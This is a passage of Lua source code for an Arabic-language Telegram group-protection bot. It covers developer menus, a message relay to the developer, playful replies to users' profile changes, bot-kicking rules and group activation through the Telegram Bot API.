DevFeras:incr(DevFeras..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevFeras:incr(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevFeras:sismember(DevFeras.."bot:userss",msg.chat_id_) then
DevFeras:sadd(DevFeras.."bot:userss",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source DevFeras     --
if ChatType == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' then 
if Sudo(msg) then 
local Sudo_Welcome = '⌁︙مرحبا عزيزي المطور \n⌁︙انت المطور الاساسي هنا \n⌁︙اليك ازرار سورس فراس Feras \n⌁︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'وضع اسم البوت','↫ تحديث ⌁','ضع كليشه المطور'},
{'↫ المطورين ⌁','↫ الاحصائيات ⌁'},
{'↫ المجموعات ⌁','روابط القروبات','↫ المشتركين ⌁'},
{'↫ تعطيل التواصل ⌁','↫ تفعيل التواصل ⌁'},
{'تنظيف القروبات','↫ قائمه العام ⌁','تنظيف المشتركين'},
{'↫ اذاعه بالتثبيت ⌁'},
{'↫ اذاعه عام ⌁','↫ اذاعه خاص ⌁'},
{'↫ اذاعه عام بالتوجيه ⌁','↫ اذاعه خاص بالتوجيه ⌁'},
{'~ تعيين كلايش الاوامر ~'},
{'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
{'نسخه ملف السورس','تحديث السورس','جلب نسخه القروبات'},
{'↫ حذف رد عام ⌁','↫ الردود العام ⌁','↫ اضف رد عام ⌁'},
{'↫ حذف رد الخاص ⌁','↫ تعيين رد الخاص ⌁'},
{'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
{'حذف كليشه الاشتراك','كليشه الاشتراك','تغيير كليشه الاشتراك'},
{'↫ تعطيل المغادره ⌁','↫ تفعيل المغادره ⌁'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ تعيين كلايش الاوامر ~' then 
if Sudo(msg) then 
local Sudo_Welcome = '⌁︙اهلا بك مجددا عزيزي المطور \n⌁︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس فراس Feras فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/start' then  
if not DevFeras:get(DevFeras..'Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {{{text="⌁ ︙ المطور ︙ ⌁",url="t.me/"..(dp.username_ or "Dev_Prox")}}}
local start = DevFeras:get(DevFeras.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌁︙ مرحبا انا بوت اسمي "..name_bot.."\n⌁︙اختصاصي حماية المجموعات\n⌁︙من التفليش والسبام والخخ .. . ،\n⌁︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
DevFeras:setex(DevFeras..'Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source DevFeras     --
if not Sudo(msg) and not DevFeras:sismember(DevFeras..'BaN:In:User',msg.sender_user_id_) and not DevFeras:get(DevFeras..'Texting:In:Bv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Feras(msg.sender_user_id_, msg.id_, 1, '⌁︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "Dev_Prox")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'⌁︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if Sudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevFeras:sadd(DevFeras..'BaN:In:User',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevFeras:srem(DevFeras..'BaN:In:User',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_Feras(id_user, 0, 1, text, 1, "md")  
Text = '⌁︙تم ارسال الرساله الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '⌁︙تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '⌁︙تم ارسال الصوره الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '⌁︙تم ارسال المتحركه الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '⌁︙تم ارسال البصمه الى ↫ ⤈'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     Source DevFeras     --
if text and DevFeras:get(DevFeras..'Start:Bots') then
if text == 'الغاء' then   
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevFeras:del(DevFeras..'Start:Bots') 
return false
end
DevFeras:set(DevFeras.."Start:Bot",text)  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الستارت', 1, 'md')
DevFeras:del(DevFeras..'Start:Bots') 
return false
end
if Sudo(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص ⌁' then 
DevFeras:set(DevFeras..'Start:Bots',true) 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص ⌁' then 
DevFeras:del(DevFeras..'Start:Bot') 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' then  
local start = DevFeras:get(DevFeras.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌁︙مرحبا انا بوت اسمي "..name_bot.."\n⌁︙اختصاصي حماية المجموعات\n⌁︙من التفليش والسبام والخخ .. . ،\n⌁︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_Feras(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
end
--     Source DevFeras     --
if Sudo(msg) then
if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل ⌁' then   
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'Texting:In:Bv') 
end
if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل ⌁' then  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'Texting:In:Bv',true) 
end
end
--     Source DevFeras     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if text and not DevFeras:get(DevFeras..'lock:bot:ttt'..bot_id) and not DevFeras:get(DevFeras.."lock:bot:ttt2:"..msg.chat_id_) then 
function Feras_dev(extra,result,success)
if result.id_ then 
local abbs = DevFeras:get("Feras_dev:name"..result.id_)
if not result.first_name_ then 
if abbs then 
DevFeras:del("Feras_dev:name"..result.id_) 
end
end
if result.first_name_ then 
if abbs and abbs ~= result.first_name_ then 
local abs_text = {
"اسمك الجديد { "..result.first_name_.." }\n ليش غيرته 🌚😹",
"وفف اسمكك الجديد يشكك، 🤤♥️ ",
"ليش غيرت اسمك { "..result.first_name_.." }\n قطيت احد حبي ؟ 🌚😹",
"اسمك الجديد { "..result.first_name_.." }\n فد شي وين زخرفته ؟، 🤤♥️", 
}
abbss = math.random(#abs_text)
Dev_Feras(msg.chat_id_, msg.id_, 1, abs_text[abbss], 1, 'html')
end  
DevFeras:set("Feras_dev:name"..result.id_, result.first_name_)  
end
end
end
getUser(msg.sender_user_id_, Feras_dev)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
DevFeras:set(DevFeras.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = DevFeras:get(DevFeras.."abs:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg.sender_user_id_, msg.chat_id_) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg.sender_user_id_, msg.chat_id_) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = DevFeras:get(DevFeras.."abs:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg.sender_user_id_, msg.chat_id_) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg.sender_user_id_, msg.chat_id_) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = DevFeras:get(DevFeras.."abs:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg.sender_user_id_, msg.chat_id_) then
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevFeras:sadd(DevFeras..'abs:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(DevFeras) then 
DevFeras:srem(DevFeras.."bot:groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
SendText(DevId,"⌁︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevFeras:get(DevFeras..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
DeleteMessage(chat,msgs)    
end   
end
local msg = data.message_
text = msg.content_.text_
if text and not DevFeras:get(DevFeras..'lock:bot:ttt'..bot_id) and not DevFeras:get(DevFeras.."lock:bot:ttt2:"..msg.chat_id_) then  
function Feras_dev(extra,result,success)
if result.id_ then 
local abbs = DevFeras:get("Feras_dev:Userr"..result.id_)
if not result.username_ then 
if abbs then 
Dev_Feras(msg.chat_id_, msg.id_, 1, "المعرف محذوف، \nهذا معرفه @"..abbs.."", 1, 'html')
DevFeras:del("Feras_dev:Userr"..result.id_) 
end
end
if result.username_ then 
if abbs and abbs ~= result.username_ then 
local abs_text = {
'معرفك جديد 樂؟',
"اشوفك مغير معرفك ليه ناشرين عليك بلاك ليست ؟ 藍",
"معرفك الجديد حلو منين خامطه؟!🤤♥️",
"معرفك القديم @"..result.username_.." شكله فخم ",
}
abbss = math.random(#abs_text)
Dev_Feras(msg.chat_id_, msg.id_, 1, abs_text[abbss], 1, 'html')
end  
DevFeras:set("Feras_dev:Userr"..result.id_, result.username_) 
end
end
end
getUser(msg.sender_user_id_, Feras_dev)
end
local msg = data.message_
text = msg.content_.text_
if text and not DevFeras:get(DevFeras..'lock:bot:ttt'..bot_id) and not DevFeras:get(DevFeras.."lock:bot:ttt2:"..msg.chat_id_) then  
function abbs(extra,result,success)
if result.id_ then 
local abbs2 = DevFeras:get("abbs:photo"..result.id_)
if not result.profile_photo_ then 
if abbs2 then 
Dev_Feras(msg.chat_id_, msg.id_, 1, "ليه حذفت صور بورفيلك كانت فخمه 梁", 1, 'html')
DevFeras:del("abbs:photo"..result.id_) 
end
end
if result.profile_photo_ then 
if abbs2 and abbs2 ~= result.profile_photo_.big_.persistent_id_ then 
local abbs_text = {
"يواد صورتك الجديده مولعه ",
"اويلي ي الصوره ممكن اسرقها؟",
"صورتك عجبتني 梁",
"وش هالجمال يسطا صورتك الجديده دمرتني  殺",
}
abbs3 = math.random(#abbs_text)
Dev_Feras(msg.chat_id_, msg.id_, 1, abbs_text[abbs3], 1, 'html')
end  
DevFeras:set("abbs:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
end
end
end
getUser(msg.sender_user_id_, abbs)
end
--     Source DevFeras     --
function MuteTime(chat_id,user_id,time) local mut = 'https://api.telegram.org/bot'..TokenBot.. '/restrictChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id..'&can_post_messages=false&until_date='..time return https.request(mut) end
--     Source DevFeras     --
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = msg.content_.text_ 
--     Source DevFeras     --
if text ==('تفعيل') and not SudoBot(msg.sender_user_id_, msg.chat_id_) and SourceCh(msg) then
if not DevFeras:get(DevFeras..'lock:bot:free'..bot_id) then
if ChatType == 'pv' then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
DevFeras:del(DevFeras..'abs:absmonsh:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevFeras:sadd(DevFeras.."abs:monsh:"..msg.chat_id_,admins[i].user_id_)
DevFeras:sadd(DevFeras.."abs:absmonsh:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevFeras:srem(DevFeras.."abs:monsh:"..msg.chat_id_,admins[i].user_id_)
DevFeras:srem(DevFeras.."abs:absmonsh:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevFeras:sismember(DevFeras..'bot:groups',msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevFeras:get(DevFeras..'abs:Num:Add:Bot') or 0) and not Sudo(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevFeras:get(DevFeras..'abs:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyAdd","⌁︙تم تفعيل المجموعه "..dp.title_)  
DevFeras:sadd(DevFeras.."bot:groups",msg.chat_id_)
DevFeras:sadd(DevFeras..'abs:monsh:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevFeras:set(DevFeras.."bot:group:link"..msg.chat_id_,LinkGroup) 
SendText(DevId,"⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙موقعه في المجموعه ↫ "..status.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
--     Source DevFeras     --
if msg.date_ < (os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     Source DevFeras     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevFeras:set(DevFeras..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source DevFeras     --
local idf = tostring(msg.chat_id_)
if not DevFeras:sismember(DevFeras.."bot:groups",msg.chat_id_) and not idf:match("^(%d+)") and not SudoBot(msg.sender_user_id_, msg.chat_id_) then
print("Return False [ Not Enable ]")
return false
end
DevFeras:incr(DevFeras.."bot:allmsgs")
--     Source DevFeras     --
-------- MSG TYPES ---------
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageChatAddMembers" then
DevFeras:incr(DevFeras..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg.sender_user_id_, msg.chat_id_) then 
if DevFeras:get(DevFeras.."bot:Join:mute"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
DevFeras:incr(DevFeras.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
if not Owner(msg.sender_user_id_, msg.chat_id_) then 
local filter = DevFeras:smembers(DevFeras.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙عذرا عزيزي ↫ [@"..data.username_.."]\n⌁︙الصوره التي ارسلتها تم منعها من المجموعه", 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙عذرا عزيزي ↫ ["..data.first_name_.."](T.ME/DevFeras)\n⌁︙الصوره التي ارسلتها تم منعها من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
DevFeras:incr(DevFeras.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
if not Owner(msg.sender_user_id_, msg.chat_id_) then 
local filter = DevFeras:smembers(DevFeras.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙عذرا عزيزي ↫ [@"..data.username_.."]\n⌁︙المتحركه التي ارسلتها تم منعها من المجموعه", 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙عذرا عزيزي ↫ ["..data.first_name_.."](T.ME/DevFeras)\n⌁︙المتحركه التي ارسلتها تم منعها من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageVideo" then
DevFeras:incr(DevFeras.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAudio" then
DevFeras:incr(DevFeras.."Audio:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVoice" then
DevFeras:incr(DevFeras.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageSticker" then
DevFeras:incr(DevFeras.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
if not Owner(msg.sender_user_id_, msg.chat_id_) then 
local filter = DevFeras:smembers(DevFeras.."filtersteckr"..msg.chat_id_)
